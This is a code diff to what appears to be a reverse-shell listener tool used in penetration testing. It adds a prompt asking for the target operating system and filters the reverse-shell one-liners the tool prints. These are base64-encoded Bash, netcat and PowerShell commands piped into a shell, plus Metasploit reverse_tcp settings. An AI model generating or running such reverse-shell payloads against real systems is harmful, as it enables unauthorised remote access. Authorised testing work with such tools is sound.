@@ -588,6 +588,18 @@ def ask(text):
 			print("^C")
 			return ' '
 
+def ask_target_os():
+	"""Ask which OS the target runs, so we only show payloads that can run there.
+	Returns None if the question was not answered (empty input, Ctrl-C, or no tty)."""
+	while True:
+		answer = ask("Target OS? (linux/windows/both): ").strip().lower()
+		if not answer:
+			return None
+		for choice in ('linux', 'windows', 'both'):
+			if choice.startswith(answer):
+				return choice
+		logger.warning("Answer 'linux', 'windows' or 'both'")
+
 def my_input(text="", histfile=None, histlen=None, completer=lambda text, state: None, completer_delims=None):
 	readline_quote_chars_saved = None
 	if threading.current_thread().name == 'MainThread':
@@ -1676,13 +1688,20 @@ class MainMenu(BetterCMD):
 		"""
 		[interface_name]
 		Show example reverse-shell commands for the active listeners
+		Asks whether the target runs Linux or Windows first, so you only get the payloads that
+		can actually run there. Answer "both" for the full list.
 		"""
-		if core.listeners:
-			print()
-			for listener in list(core.listeners.values()):
-				print(listener.payloads(line))
-		else:
+		if not core.listeners:
 			cmdlogger.warning("No Listeners to show payloads")
+			return
+
+		target_os = ask_target_os()
+		if not target_os:
+			return
+
+		print()
+		for listener in list(core.listeners.values()):
+			print(listener.payloads(line, target_os))
 
 	def do_Interfaces(self, line):
 		"""
@@ -2395,7 +2414,7 @@ class TCPListener:
 		else:
 			logger.warning(f"Stopping {self}")
 
-	def payloads(self, interface_filter=None):
+	def payloads(self, interface_filter=None, target_os='both'):
 		pairs = Interfaces().pairs
 		name_of_ip = {ip: name for name, ip in pairs}
 		presets = [
@@ -2426,22 +2445,28 @@ class TCPListener:
 				iface_name = paint(iface_name).GREEN_black
 			interface_count += 1
 			output.extend((f'➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).orange)}', ''))
-			output.append(str(paint("Bash TCP").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[0].format(ip, port).encode()).decode()}|base64 -d|bash")
-			output.append("")
-			output.append(str(paint("Netcat + named pipe").UNDERLINE))
-			output.append(f"printf {base64.b64encode(presets[1].format(ip, port).encode()).decode()}|base64 -d|sh")
-			output.append("")
-			output.append(str(paint("Powershell").UNDERLINE))
-			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, port).encode("utf-16le")).decode())
+			blocks = []
+			if target_os in ('linux', 'both'):
+				blocks.append(("Bash TCP",
+					f"printf {base64.b64encode(presets[0].format(ip, port).encode()).decode()}|base64 -d|bash"))
+				blocks.append(("Netcat + named pipe",
+					f"printf {base64.b64encode(presets[1].format(ip, port).encode()).decode()}|base64 -d|sh"))
+			if target_os in ('windows', 'both'):
+				blocks.append(("Powershell",
+					"cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, port).encode("utf-16le")).decode()))
+			blocks.append(("Metasploit", "\n".join((
+				"set PAYLOAD generic/shell_reverse_tcp",
+				f"set LHOST {ip}",
+				f"set LPORT {port}",
+				"set DisablePayloadHandler true"
+			))))
 
-			output.extend(dedent(f"""
-			{paint('Metasploit').UNDERLINE}
-			set PAYLOAD generic/shell_reverse_tcp
-			set LHOST {ip}
-			set LPORT {port}
-			set DisablePayloadHandler true
-			""").split("\n"))
+			for index, (title, body) in enumerate(blocks):
+				if index:
+					output.append("")
+				output.append(str(paint(title).UNDERLINE))
+				output.append(body)
+			output.append("")
 
 		output.append("─" * 80)
 		if not interface_count:
@@ -7260,9 +7285,11 @@ def listener_menu():
 				break
 			elif command == 'p':
 				restore_tty()
-				print()
-				for listener in list(core.listeners.values()):
-					print(listener.payloads(), end='\n\n')
+				target_os = ask_target_os()
+				if target_os:
+					print()
+					for listener in list(core.listeners.values()):
+						print(listener.payloads(None, target_os), end='\n\n')
 			elif command == '\x0C':
 				os.system("clear")
 			elif command in ('q', '\x03'):
